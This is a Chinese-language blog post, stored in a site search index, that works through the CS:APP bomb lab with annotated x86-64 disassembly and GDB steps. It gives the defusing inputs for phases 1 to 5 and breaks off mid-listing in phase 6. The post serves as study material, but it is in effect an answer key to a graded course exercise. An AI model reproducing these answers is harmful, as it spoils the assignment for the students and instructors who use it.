<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>lab3_bomblab</title>
    <link href="/2021/07/04/lab3_bomb_lab/"/>
    <url>/2021/07/04/lab3_bomb_lab/</url>
    
    <content type="html"><![CDATA[<h1 id="lab3-bomb-lab"><a href="#lab3-bomb-lab" class="headerlink" title="lab3 bomb lab"></a>lab3 bomb lab</h1><h2 id="1-phase-1"><a href="#1-phase-1" class="headerlink" title="1. phase_1"></a>1. phase_1</h2><ul><li><strong>汇编代码：</strong> </li></ul><p><img src="/2021/07/04/lab3_bomb_lab/image-20210316165036780.png" alt="image-20210316165036780"></p><ul><li><p><strong>指令思路:</strong>   </p><p>将地址$0x402400存到%esi中</p><p>调用函数<strings_not_equal>将用户输入的内容与寄存器%esi中的值比较，结果返回至%eax，若相同，则返回0，反之返回1；</strings_not_equal></p><p>test  将两个数相与，若为0，则ZF标志位变为1，反之ZF为0；</p><p>若ZF为1，则je指令跳转，跳过 了explode_bomb函数，破解成功，反之不跳转，爆炸。</p></li><li><p><strong>解决方法:</strong></p><p>因此地址$0x402400中存储的值即为我们需要知道的密码</p><p>运用GDB调试工具输入指令 :</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">x</span>/s <span class="hljs-number">0</span>x<span class="hljs-number">402400</span><br></code></pre></td></tr></table></figure></li></ul><p>可得密码为：Border relations with Canada have never been better.</p><p><img src="/2021/07/04/lab3_bomb_lab/image-20210315211917616.png" alt="image-20210315211917616"></p><p><img src="/2021/07/04/lab3_bomb_lab/image-20210316171734306.png" alt="image-20210316171734306"></p><h2 id="2-phase-2"><a href="#2-phase-2" class="headerlink" title="2. phase_2"></a>2. phase_2</h2><ul><li><p><strong>汇编代码与指令思路</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0000000000400efc &lt;phase_2&gt;:<br>  400efc:55                   push   %rbp*备份<br>  400efd:53                   push   %rbx<br>  400efe:48 83 ec 28          sub    $0x28,%rsp  *开辟40字节空间<br>  400f02:48 89 e6             mov    %rsp,%rsi*<br>  400f05:e8 52 05 00 00       callq  40145c &lt;read_six_numbers&gt;*读入六个数字，首个数字存放在栈顶%rsp<br>  400f0a:83 3c 24 01          cmpl   $0x1,(%rsp)*判断a[0]是否和1相等，不相等直接爆炸<br>  400f0e:74 20                je     400f30 &lt;phase_2+0x34&gt;*相等则跳到$0x400f30<br>  400f10:e8 25 05 00 00       callq  40143a &lt;explode_bomb&gt;<br>  400f15:eb 19                jmp    400f30 &lt;phase_2+0x34&gt;<br>  400f17:8b 43 fc             mov    -0x4(%rbx),%eax*将当前数字的上一个数字存入%eax中<br>  400f1a:01 c0                add    %eax,%eax*将%eax存放的元素乘二<br>  400f1c:39 03                cmp    %eax,(%rbx)*与当前数字判断<br>  400f1e:74 05                je     400f25 &lt;phase_2+0x29&gt;*相等则跳到$0x400f25，否则爆炸<br>  400f20:e8 15 05 00 00       callq  40143a &lt;explode_bomb&gt;<br>  400f25:48 83 c3 04          add    $0x4,%rbx*取下一数字<br>  400f29:48 39 eb             cmp    %rbp,%rbx*与最后一个元素比较<br>  400f2c:75 e9                jne    400f17 &lt;phase_2+0x1b&gt;*不相等则回到$400f17，继续乘二判断操作<br>  400f2e:eb 0c                jmp    400f3c &lt;phase_2+0x40&gt;*相等则结束，跳转进行清理栈区操作<br>  400f30:48 8d 5c 24 04       lea    0x4(%rsp),%rbx*将a[1]地址赋给%rba<br>  400f35:48 8d 6c 24 18       lea    0x18(%rsp),%rbp*将a[5]地址赋给%rbp,用作终止条件<br>  400f3a:eb db                jmp    400f17 &lt;phase_2+0x1b&gt;*直接跳转到$400f17<br>  400f3c:48 83 c4 28          add    $0x28,%rsp<br>  400f40:5b                   pop    %rbx<br>  400f41:5d                   pop    %rbp<br>  400f42:c3                   retq    <br></code></pre></td></tr></table></figure></li><li><p><strong>解决方法</strong></p><p>由上述指令思路可知，第一个数为1，且之后每个数都会是前一个的两倍，否则就会爆炸。</p><p>所以密码为：1 2 4 8 16 32</p><p><img src="/2021/07/04/lab3_bomb_lab/image-20210316171653420.png" alt="image-20210316171653420"></p></li></ul><h2 id="3-phase-3"><a href="#3-phase-3" class="headerlink" title="3. phase_3"></a>3. phase_3</h2><ul><li><p><strong>汇编代码</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0000000000400f43</span> &lt;phase_<span class="hljs-number">3</span>&gt;:<br>  <span class="hljs-attribute">400f43</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> ec <span class="hljs-number">18</span>          sub    $<span class="hljs-number">0</span>x<span class="hljs-number">18</span>,%rsp<br>  <span class="hljs-attribute">400f47</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">4</span>c <span class="hljs-number">24</span> <span class="hljs-number">0</span>c       lea    <span class="hljs-number">0</span>xc(%rsp),%rcx*sscanf第四个参数，即输入的第二个数<br>  <span class="hljs-attribute">400f4c</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">54</span> <span class="hljs-number">24</span> <span class="hljs-number">08</span>       lea    <span class="hljs-number">0</span>x<span class="hljs-number">8</span>(%rsp),%rdx*sscanf第三个参数，即输入的第一个数<br>  <span class="hljs-attribute">400f51</span>:be cf <span class="hljs-number">25</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">4025</span>cf,%esi*第二个参数<br>  <span class="hljs-attribute">400f56</span>:b<span class="hljs-number">8</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">0</span>,%eax*第一个参数<br>  <span class="hljs-attribute">400f5b</span>:e<span class="hljs-number">8</span> <span class="hljs-number">90</span> fc ff ff       callq  <span class="hljs-number">400</span>bf<span class="hljs-number">0</span> &lt;__isoc<span class="hljs-number">99</span>_sscanf@plt&gt;<br>  <span class="hljs-attribute">400f60</span>:<span class="hljs-number">83</span> f<span class="hljs-number">8</span> <span class="hljs-number">01</span>             cmp    $<span class="hljs-number">0</span>x<span class="hljs-number">1</span>,%eax*%eax会返回参数个数<br>  <span class="hljs-attribute">400f63</span>:<span class="hljs-number">7</span>f <span class="hljs-number">05</span>                jg     <span class="hljs-number">400</span>f<span class="hljs-number">6</span>a &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">27</span>&gt;*大于<span class="hljs-number">1</span>才继续，否则爆炸<br>  <span class="hljs-attribute">400f65</span>:e<span class="hljs-number">8</span> d<span class="hljs-number">0</span> <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-attribute">400f6a</span>:<span class="hljs-number">83</span> <span class="hljs-number">7</span>c <span class="hljs-number">24</span> <span class="hljs-number">08</span> <span class="hljs-number">07</span>       cmpl   $<span class="hljs-number">0</span>x<span class="hljs-number">7</span>,<span class="hljs-number">0</span>x<span class="hljs-number">8</span>(%rsp)<br>  <span class="hljs-attribute">400f6f</span>:<span class="hljs-number">77</span> <span class="hljs-number">3</span>c                ja     <span class="hljs-number">400</span>fad &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">6</span>a&gt;<br>  <span class="hljs-attribute">400f71</span>:<span class="hljs-number">8</span>b <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">08</span>          mov    <span class="hljs-number">0</span>x<span class="hljs-number">8</span>(%rsp),%eax<br>  <span class="hljs-attribute">400f75</span>:ff <span class="hljs-number">24</span> c<span class="hljs-number">5</span> <span class="hljs-number">70</span> <span class="hljs-number">24</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> jmpq   *<span class="hljs-number">0</span>x<span class="hljs-number">402470</span>(,%rax,<span class="hljs-number">8</span>)<br>  <span class="hljs-attribute">400f7c</span>:b<span class="hljs-number">8</span> cf <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>xcf,%eax<br>  <span class="hljs-attribute">400f81</span>:eb <span class="hljs-number">3</span>b                jmp    <span class="hljs-number">400</span>fbe &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">7</span>b&gt;<br>  <span class="hljs-attribute">400f83</span>:b<span class="hljs-number">8</span> c<span class="hljs-number">3</span> <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">2</span>c<span class="hljs-number">3</span>,%eax<br>  <span class="hljs-attribute">400f88</span>:eb <span class="hljs-number">34</span>                jmp    <span class="hljs-number">400</span>fbe &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">7</span>b&gt;<br>  <span class="hljs-attribute">400f8a</span>:b<span class="hljs-number">8</span> <span class="hljs-number">00</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">100</span>,%eax<br>  <span class="hljs-attribute">400f8f</span>:eb <span class="hljs-number">2</span>d                jmp    <span class="hljs-number">400</span>fbe &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">7</span>b&gt;<br>  <span class="hljs-attribute">400f91</span>:b<span class="hljs-number">8</span> <span class="hljs-number">85</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">185</span>,%eax<br>  <span class="hljs-attribute">400f96</span>:eb <span class="hljs-number">26</span>                jmp    <span class="hljs-number">400</span>fbe &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">7</span>b&gt;<br>  <span class="hljs-attribute">400f98</span>:b<span class="hljs-number">8</span> ce <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>xce,%eax<br>  <span class="hljs-attribute">400f9d</span>:eb <span class="hljs-number">1</span>f                jmp    <span class="hljs-number">400</span>fbe &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">7</span>b&gt;<br>  <span class="hljs-attribute">400f9f</span>:b<span class="hljs-number">8</span> aa <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">2</span>aa,%eax<br>  <span class="hljs-attribute">400fa4</span>:eb <span class="hljs-number">18</span>                jmp    <span class="hljs-number">400</span>fbe &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">7</span>b&gt;<br>  <span class="hljs-attribute">400fa6</span>:b<span class="hljs-number">8</span> <span class="hljs-number">47</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">147</span>,%eax<br>  <span class="hljs-attribute">400fab</span>:eb <span class="hljs-number">11</span>                jmp    <span class="hljs-number">400</span>fbe &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">7</span>b&gt;<br>  <span class="hljs-attribute">400fad</span>:e<span class="hljs-number">8</span> <span class="hljs-number">88</span> <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-attribute">400fb2</span>:b<span class="hljs-number">8</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">0</span>,%eax<br>  <span class="hljs-attribute">400fb7</span>:eb <span class="hljs-number">05</span>                jmp    <span class="hljs-number">400</span>fbe &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">7</span>b&gt;<br>  <span class="hljs-attribute">400fb9</span>:b<span class="hljs-number">8</span> <span class="hljs-number">37</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">137</span>,%eax<br>  <span class="hljs-attribute">400fbe</span>:<span class="hljs-number">3</span>b <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">0</span>c          cmp    <span class="hljs-number">0</span>xc(%rsp),%eax<br>  <span class="hljs-attribute">400fc2</span>:<span class="hljs-number">74</span> <span class="hljs-number">05</span>                je     <span class="hljs-number">400</span>fc<span class="hljs-number">9</span> &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">86</span>&gt;<br>  <span class="hljs-attribute">400fc4</span>:e<span class="hljs-number">8</span> <span class="hljs-number">71</span> <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-attribute">400fc9</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c<span class="hljs-number">4</span> <span class="hljs-number">18</span>          add    $<span class="hljs-number">0</span>x<span class="hljs-number">18</span>,%rsp<br>  <span class="hljs-attribute">400fcd</span>:c<span class="hljs-number">3</span>                   retq    <br><br></code></pre></td></tr></table></figure></li><li><p><strong>指令思路与解决方法</strong></p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210316175426399.png"></p><p>这部分代码读入参数</p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210316174708562.png" alt="image-20210316174708562"></p><p>这部分代码先判断sscanf的参数个数返回值%eax是否大于1，大于继续，否则爆炸</p><p>在判断输入的第一个数字是否小于7，小于继续，否则爆炸。</p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210316175205802.png" alt="image-20210316175205802"></p><p>这部分代码会跳转至M[0x402470+%rax*8]所在地址,</p><p>用gdb指令查看0x402470 处的值<img src="/2021/07/04/lab3_bomb_lab/image-20210316175832024.png" alt="image-20210316175832024"></p><p>通过观察可以发现，jump之后的指令都是功能类似的重复指令，因此我们只需选择一组跳转即可</p><p>因为0x402470 处的值即为jmpq后第一个mov指令所在地址，该操作会将0xcf(207)赋值给%eax。因此我们可以取第一个数为0，第二个数为207。因为之后的cmp会比较%eax的值和我们输入的第二个数，不相同会爆炸</p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210316180239126.png" alt="image-20210316180239126"></p><p>故密码可为：0 207或2 707等等，答案不唯一</p><p><img src="/2021/07/04/lab3_bomb_lab/image-20210316181230534.png" alt="image-20210316181230534"></p><p><img src="/2021/07/04/lab3_bomb_lab/image-20210316181134846.png" alt="image-20210316181134846"></p></li></ul><h2 id="4-phase-4"><a href="#4-phase-4" class="headerlink" title="4. phase_4"></a>4. phase_4</h2><ul><li><p><strong>汇编代码：</strong></p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210316204437370.png" alt="image-20210316204437370"></p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210316204525714.png" alt="image-20210316204525714"></p></li><li><p><strong>指令思路和解决方法：</strong></p><p>首先我们发现这还是和phase_3一样传入2参数，可以通过查看0x4025cf得知；</p><p>之后将第一个数字和0xe比较，如果小于等于就跳转，否则爆炸；</p><p>跳转后来到mov指令，赋值后：%edx=0xe,%esi=0x0，%edi=参数x<del>1</del>;之后调用函数func4()，可知前面三个寄存器存放函数func4的三个参数；</p><p>来到func4里，%eax经过mov指令后变成0xe，sub后保持不变，之后将%eax的值赋给%ecx, shr为将%ecx逻辑右移31位，%ecx=0;</p><p>sar无移位参数，默认右移一位，%eax=0x7;</p><p>lea:%ecx=%rax+%rsi*1=0x7+0*1=0x7;</p><p>之后将参数x<del>1</del>与%ecx比较，即0x7比较，若小于等于且大于等于则结束，且返回值%eax=0；否则将参数x<del>1</del>－1后继续调用func4。</p><p>回到phase_4，可知要使func4返回值为0，否则就会爆炸，所以当x1为7时恰好可以使返回值为0，符合；</p><p>之后很容易得到必须要使得第二个数为0，否则就会爆炸；</p><p>故密码为：7 0</p><p><img src="/2021/07/04/lab3_bomb_lab/image-20210316212318867.png" alt="image-20210316212318867"></p></li></ul><h2 id="5-phase-5"><a href="#5-phase-5" class="headerlink" title="5. phase_5"></a>5. phase_5</h2><ul><li><p><strong>汇编代码与指令思路</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0000000000401062 &lt;phase_5&gt;:<br>  401062:53                   push   %rbx<br>  401063:48 83 ec 20          sub    $0x20,%rsp<br>  401067:48 89 fb             mov    %rdi,%rbx*将我们输入的传给%rdx<br>  40106a:64 48 8b 04 25 28 00 mov    %fs:0x28,%rax<br>  401071:00 00 <br>  401073:48 89 44 24 18       mov    %rax,0x18(%rsp)<br>  401078:31 c0                xor    %eax,%eax*重置%rax为0<br>  40107a:e8 9c 02 00 00       callq  40131b &lt;string_length&gt;*判断长度<br>  40107f:83 f8 06             cmp    $0x6,%eax<br>  401082:74 4e                je     4010d2 &lt;phase_5+0x70&gt;*不为6则爆炸<br>  401084:e8 b1 03 00 00       callq  40143a &lt;explode_bomb&gt;<br>  401089:eb 47                jmp    4010d2 &lt;phase_5+0x70&gt;<br>  40108b:0f b6 0c 03          movzbl (%rbx,%rax,1),%ecx<br>  40108f:88 0c 24             mov    %cl,(%rsp)<br>  401092:48 8b 14 24          mov    (%rsp),%rdx*1.上述三个操作将我们输入的字符的低四位传给%rdx<br>  401096:83 e2 0f             and    $0xf,%edx<br>  401099:0f b6 92 b0 24 40 00 movzbl 0x4024b0(%rdx),%edx*2.将%rdx的值作为偏移量，取内存中的M[0x4024b0+%rdx]的值<br>  4010a0:88 54 04 10          mov    %dl,0x10(%rsp,%rax,1)*取出来的字符存到后面的地址中<br>  4010a4:48 83 c0 01          add    $0x1,%rax*将上述操作重复6次<br>  4010a8:48 83 f8 06          cmp    $0x6,%rax<br>  4010ac:75 dd                jne    40108b &lt;phase_5+0x29&gt;<br>  4010ae:c6 44 24 16 00       movb   $0x0,0x16(%rsp)<br>  4010b3:be 5e 24 40 00       mov    $0x40245e,%esi<br>  4010b8:48 8d 7c 24 10       lea    0x10(%rsp),%rdi*将取出来的6个字符存到%rdi中<br>  4010bd:e8 76 02 00 00       callq  401338 &lt;strings_not_equal&gt;*与0x40245e地址中值比较，不相等就会爆炸<br>  4010c2:85 c0                test   %eax,%eax<br>  4010c4:74 13                je     4010d9 &lt;phase_5+0x77&gt;<br>  4010c6:e8 6f 03 00 00       callq  40143a &lt;explode_bomb&gt;<br>  4010cb:0f 1f 44 00 00       nopl   0x0(%rax,%rax,1)<br>  4010d0:eb 07                jmp    4010d9 &lt;phase_5+0x77&gt;<br>  4010d2:b8 00 00 00 00       mov    $0x0,%eax<br>  4010d7:eb b2                jmp    40108b &lt;phase_5+0x29&gt;<br>  4010d9:48 8b 44 24 18       mov    0x18(%rsp),%rax<br>  4010de:64 48 33 04 25 28 00 xor    %fs:0x28,%rax<br>  4010e5:00 00 <br>  4010e7:74 05                je     4010ee &lt;phase_5+0x8c&gt;<br>  4010e9:e8 42 fa ff ff       callq  400b30 &lt;__stack_chk_fail@plt&gt;<br>  4010ee:48 83 c4 20          add    $0x20,%rsp<br>  4010f2:5b                   pop    %rbx<br>  4010f3:c3                   retq  <br></code></pre></td></tr></table></figure></li><li><p><strong>解决方法：</strong></p><p>上述指令简而言之就是我们输入6个字符，然后取这6个字符的后4位作为地址索引，取内存中的M[0x4024b0+%rdx]的值，存到另一个寄存器中，然后将这个值与M[0x40245e]中的值比较，相等则结束，否则爆炸；</p><p>所以我们先查看内存0x4024b0为起始的地址中存放的元素：</p><p><img src="/2021/07/04/lab3_bomb_lab/image-20210317085034624.png" alt="image-20210317085034624"></p><p>然后查看0x40245e中的值：</p><p><img src="/2021/07/04/lab3_bomb_lab/image-20210317085132914.png" alt="image-20210317085132914"></p><p>然后在上一个字符串中查看后一个字符串对应的下标，很容易得到下标分别为：9  15  14  5  6  7</p><p>这六个数低四位的16进制为：0x9  0xf  0xe 0x5 0x6  0x7</p><p>查看ASSCI表可知9?n567或  9?&gt;567都可以。</p><p>所以密码可以为9?n567或  9?&gt;567等等，答案不唯一</p><p><img src="/2021/07/04/lab3_bomb_lab/image-20210317090128611.png" alt="image-20210317090128611"></p></li></ul><h2 id="6-phase-6"><a href="#6-phase-6" class="headerlink" title="6. phase_6"></a>6. phase_6</h2><ul><li><p>汇编代码和指令思路</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00000000004010f4 &lt;phase_6&gt;:<br>  4010f4:41 56                push   %r14<br>  4010f6:41 55                push   %r13<br>  4010f8:41 54                push   %r12<br>  4010fa:55                   push   %rbp<br>  4010fb:53                   push   %rbx<br>  4010fc:48 83 ec 50          sub    $0x50,%rsp<br>  401100:49 89 e5             mov    %rsp,%r13<br>  401103:48 89 e6             mov    %rsp,%rsi<br>  401106:e8 51 03 00 00       callq  40145c &lt;read_six_numbers&gt;*读取六个数字<br>  40110b:49 89 e6             mov    %rsp,%r14<br>  40110e:41 bc 00 00 00 00    mov    $0x0,%r12d<br>  401114:4c 89 ed             mov    %r13,%rbp<br>  401117:41 8b 45 00          mov    0x0(%r13),%eax<br>  40111b:83 e8 01             sub    $0x1,%eax<br>  40111e:83 f8 05             cmp    $0x5,%eax<br>  401121:76 05                jbe    401128 &lt;phase_6+0x34&gt;*第一个循环，判断a[0]&lt;=6,是继续，否则爆炸<br>  401123:e8 12 03 00 00       callq  40143a &lt;explode_bomb&gt;<br>  401128:41 83 c4 01          add    $0x1,%r12d*%r12d为第一个循环计数器<br>  40112c:41 83 fc 06          cmp    $0x6,%r12d<br>  401130:74 21                je     401153 &lt;phase_6+0x5f&gt;*终止条件，六次后结束<br>  401132:44 89 e3             mov    %r12d,%ebx<br>  401135:48 63 c3             movslq %ebx,%rax<br>  401138:8b 04 84             mov    (%rsp,%rax,4),%eax<br>  40113b:39 45 00             cmp    %eax,0x0(%rbp)<br>  40113e:75 05                jne    401145 &lt;phase_6+0x51&gt;*第二个循环，a[i++],依次和a[0]比较，相同则爆炸<br>  401140:e8 f5 02 00 00       callq  40143a &lt;explode_bomb&gt;<br>  401145:83 c3 01             add    $0x1,%ebx*%ebx为第二个循环计数器，计数5次<br>  401148:83 fb 05             cmp    $0x5,%ebx<br>  40114b:7e e8                jle    401135 &lt;phase_6+0x41&gt;<br>  40114d:49 83 c5 04          add    $0x4,%r13*结合这行，第一个循环就是判断每个数都小于等于6<br>  401151:eb c1                jmp    401114 &lt;phase_6+0x20&gt;<br>  401153:48 8d 74 24 18       lea    0x18(%rsp),%rsi<br>  401158:4c 89 f0             mov    %r14,%rax<br>  40115b:b9 07 00 00 00       mov    $0x7,%ecx<br>  401160:89 ca                mov    %ecx,%edx<br>  401162:2b 10                sub    (%rax),%edx<br>  401164:89 10                mov    %edx,(%rax)<br>  401166:48 83 c0 04          add    $0x4,%rax<br>  40116a:48 39 f0             cmp    %rsi,%rax<br>  40116d:75 f1                jne    401160 &lt;phase_6+0x6c&gt;*第三层循环之后，a[i]=7-a[i] <br>  40116f:be 00 00 00 00       mov    $0x0,%esi<br>  401174:eb 21                jmp    401197 &lt;phase_6+0xa3&gt;<br>  401176:48 8b 52 08          mov    0x8(%rdx),%rdx<br>  40117a:83 c0 01             add    $0x1,%eax<br>  40117d:39 c8                cmp    %ecx,%eax<br>  40117f:75 f5                jne    401176 &lt;phase_6+0x82&gt;<br>  401181:eb 05                jmp    401188 &lt;phase_6+0x94&gt;<br>  401183:ba d0 32 60 00       mov    $0x6032d0,%edx<br>  401188:48 89 54 74 20       mov    %rdx,0x20(%rsp,%rsi,2)<br>  40118d:48 83 c6 04          add    $0x4,%rsi<br>  401191:48 83 fe 18          cmp    $0x18,%rsi<br>  401195:74 14                je     4011ab &lt;phase_6+0xb7&gt;<br>  401197:8b 0c 34             mov    (%rsp,%rsi,1),%ecx<br>  40119a:83 f9 01             cmp    $0x1,%ecx<br>  40119d:7e e4                jle    401183 &lt;phase_6+0x8f&gt;<br>  40119f:b8 01 00 00 00       mov    $0x1,%eax<br>  4011a4:ba d0 32 60 00       mov    $0x6032d0,%edx*存放链表结点数值的起始地址<br>  4011a9:eb cb                jmp    401176 &lt;phase_6+0x82&gt;<br>  4011ab:48 8b 5c 24 20       mov    0x20(%rsp),%rbx<br>  4011b0:48 8d 44 24 28       lea    0x28(%rsp),%rax<br>  4011b5:48 8d 74 24 50       lea    0x50(%rsp),%rsi<br>  4011ba:48 89 d9             mov    %rbx,%rcx<br>  4011bd:48 8b 10             mov    (%rax),%rdx<br>  4011c0:48 89 51 08          mov    %rdx,0x8(%rcx)<br>  4011c4:48 83 c0 08          add    $0x8,%rax<br>  4011c8:48 39 f0             cmp    %rsi,%rax<br>  4011cb:74 05                je     4011d2 &lt;phase_6+0xde&gt;<br>  4011cd:48 89 d1             mov    %rdx,%rcx<br>  4011d0:eb eb                jmp    4011bd &lt;phase_6+0xc9&gt;*确定链表数字为降序排序<br>  4011d2:48 c7 42 08 00 00 00 movq  